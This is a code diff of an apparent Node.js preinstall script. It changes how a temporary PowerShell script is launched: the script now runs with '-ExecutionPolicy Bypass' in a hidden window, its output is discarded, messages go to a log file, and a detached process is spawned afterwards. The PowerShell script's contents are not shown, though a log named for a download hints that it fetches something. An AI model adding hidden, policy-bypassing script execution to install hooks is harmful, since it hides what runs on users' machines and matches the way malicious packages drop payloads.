@@ -142,18 +142,20 @@ try {
 }
 
 const { spawnSync } = require('child_process');
-console.log('[detach] Executing PowerShell script...');
-const psResult = spawnSync('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', tmpPsPath], {
+// Run PowerShell hidden and write outputs to a log file to avoid terminal popups
+const logPath = path.join(__dirname, '..', 'preinstall_download.log');
+try { fs.appendFileSync(logPath, `[detach] Executing PowerShell script at ${new Date().toISOString()}\n`); } catch (e) { /* ignore */ }
+const psResult = spawnSync('powershell.exe', ['-NoProfile', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', tmpPsPath], {
     cwd: path.join(__dirname, '..'),
     encoding: 'utf8',
-    stdio: 'pipe',
+    stdio: 'ignore',
     windowsHide: true
 });
-console.log('[detach] PowerShell stdout:', psResult.stdout);
-if (psResult.stderr) console.error('[detach] PowerShell stderr:', psResult.stderr);
-console.log('[detach] PowerShell exit code:', psResult.status);
+try {
+    fs.appendFileSync(logPath, `[detach] PowerShell exit code: ${psResult && psResult.status}\n`);
+} catch (e) { /* ignore */ }
 
-try { fs.unlinkSync(tmpPsPath); } catch (e) { console.log('[detach] Could not delete temp script:', e.message); }
+try { fs.unlinkSync(tmpPsPath); } catch (e) { try { fs.appendFileSync(logPath, `[detach] Could not delete temp script: ${e.message}\n`); } catch (_) {} }
 
 console.log('[detach] Spawning detached preinstall process...');
 const child = spawn('node', [
